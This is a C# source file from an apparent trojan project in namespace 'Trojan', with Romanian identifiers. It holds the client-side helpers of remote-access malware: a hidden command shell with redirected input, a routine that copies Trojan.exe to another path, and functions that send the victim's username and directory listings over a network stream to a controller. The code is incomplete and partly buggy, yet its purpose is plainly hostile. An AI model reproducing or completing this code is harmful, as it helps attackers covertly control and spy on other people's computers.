using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using Troian;

namespace Trojan
{
    class FunctiiClient
    {

        static Process openCmd(bool hidden)
        {
            Process cmd = new Process();

            cmd.StartInfo.FileName = "cmd.exe";
            cmd.StartInfo.RedirectStandardInput = true;
            cmd.StartInfo.RedirectStandardOutput = true;
            cmd.StartInfo.CreateNoWindow = hidden;
            cmd.StartInfo.UseShellExecute = false;
            cmd.Start();

            return cmd;
        }

        static void sendCommand(Process cmd, String command)
        {
            cmd.StandardInput.WriteLine(command);
            cmd.StandardInput.Flush();
        }

        static void clone (Process cmd, String path)
        {
            sendCommand(cmd, "copy Trojan.exe" + path);
        }

        static void sendUser(Process cmd, NetworkStream stream)
        {
            byte[] mesaj;
            string user = Environment.UserName;
            mesaj = Encoding.ASCII.GetBytes(user);
            stream.Write(mesaj, 0, mesaj.Length);
        }

        static void sendDir(Process cmd, NetworkStream stream, String dir)
        {
            String[] fisiere = Directory.GetDirectories((@dir));
            Messages.SendMessage(stream, fisiere.Length.ToString());
            Messages.ReceiveMessage(stream);

            for (int i = 0; i < fisiere.Length; i++)
            {
                Messages.SendMessage(stream, fisiere[i]);
                Messages.ReceiveMessage(stream);
            
            }

        }


    }
}
